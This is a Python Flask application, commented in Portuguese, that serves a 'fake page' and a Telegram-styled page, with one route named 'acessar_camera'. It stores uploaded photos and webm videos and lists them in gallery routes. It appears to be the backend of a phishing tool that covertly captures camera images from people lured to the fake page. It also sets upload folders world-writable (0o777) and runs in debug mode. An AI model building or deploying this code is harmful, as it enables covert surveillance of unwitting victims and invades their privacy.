from flask import Flask, render_template, request, redirect, url_for, send_from_directory
import os
from datetime import datetime
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)

# Configuração das pastas de upload
if os.environ.get('RENDER'):
    # Caminho no Render.com
    UPLOAD_FOLDER = '/opt/render/project/src/uploads'
else:
    # Caminho local
    UPLOAD_FOLDER = os.path.abspath('uploads')

FOTOS_FOLDER = os.path.join(UPLOAD_FOLDER, 'fotos')
VIDEOS_FOLDER = os.path.join(UPLOAD_FOLDER, 'videos')

# Criar as pastas se não existirem
try:
    os.makedirs(FOTOS_FOLDER, exist_ok=True)
    os.makedirs(VIDEOS_FOLDER, exist_ok=True)
    # Dar permissões totais às pastas
    os.chmod(UPLOAD_FOLDER, 0o777)
    os.chmod(FOTOS_FOLDER, 0o777)
    os.chmod(VIDEOS_FOLDER, 0o777)
    app.logger.info(f'Pastas criadas: {UPLOAD_FOLDER}, {FOTOS_FOLDER}, {VIDEOS_FOLDER}')
except Exception as e:
    app.logger.error(f'Erro ao criar pastas: {str(e)}')

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # limite de 16MB por arquivo

# Rota para servir arquivos de upload
@app.route('/uploads/fotos/<filename>')
def foto_file(filename):
    app.logger.info(f'Tentando acessar foto: {filename}')
    try:
        return send_from_directory(FOTOS_FOLDER, filename)
    except Exception as e:
        app.logger.error(f'Erro ao acessar foto {filename}: {str(e)}')
        return 'Erro ao acessar arquivo', 404

@app.route('/uploads/videos/<filename>')
def video_file(filename):
    app.logger.info(f'Tentando acessar vídeo: {filename}')
    try:
        return send_from_directory(VIDEOS_FOLDER, filename)
    except Exception as e:
        app.logger.error(f'Erro ao acessar vídeo {filename}: {str(e)}')
        return 'Erro ao acessar arquivo', 404

@app.route('/')
def index():
    link_pagina_fake = url_for('index')
    return render_template('index.html', link_pagina_fake=link_pagina_fake)

@app.route('/fake')
def pagina_fake():
    return render_template('pagina_fake.html')

@app.route('/telegram')
def telegram():
    return render_template('telegram.html')

@app.route('/telegram')
def acessar_camera():
    return render_template('telegram.html')

@app.route('/salvar_midia', methods=['POST'])
def salvar_midia():
    response = {'success': False, 'message': '', 'path': ''}
    
    try:
        if 'foto' in request.files:
            foto = request.files['foto']
            if foto.filename != '':
                nome_foto = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                caminho_foto = os.path.join(FOTOS_FOLDER, nome_foto)
                foto.save(caminho_foto)
                app.logger.info(f'Foto salva em: {caminho_foto}')
                response['success'] = True
                response['path'] = f'/uploads/fotos/{nome_foto}'
                
        if 'video' in request.files:
            video = request.files['video']
            if video.filename != '':
                nome_video = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
                caminho_video = os.path.join(VIDEOS_FOLDER, nome_video)
                video.save(caminho_video)
                app.logger.info(f'Vídeo salvo em: {caminho_video}')
                response['success'] = True
                response['path'] = f'/uploads/videos/{nome_video}'
                
        response['message'] = 'Mídia salva com sucesso!'
    except Exception as e:
        app.logger.error(f'Erro ao salvar mídia: {str(e)}')
        response['message'] = f'Erro ao salvar mídia: {str(e)}'
    
    return response

@app.route('/fotos')
def listar_fotos():
    try:
        fotos = os.listdir(FOTOS_FOLDER)
        app.logger.info(f'Fotos encontradas: {fotos}')
    except Exception as e:
        app.logger.error(f'Erro ao listar fotos: {str(e)}')
        fotos = []
    return render_template('fotos.html', fotos=fotos)

@app.route('/videos')
def listar_videos():
    try:
        videos = os.listdir(VIDEOS_FOLDER)
        app.logger.info(f'Vídeos encontrados: {videos}')
    except Exception as e:
        app.logger.error(f'Erro ao listar vídeos: {str(e)}')
        videos = []
    return render_template('videos.html', videos=videos)

# Necessário para Render
application = app

if __name__ == '__main__':
    app.run(debug=True)
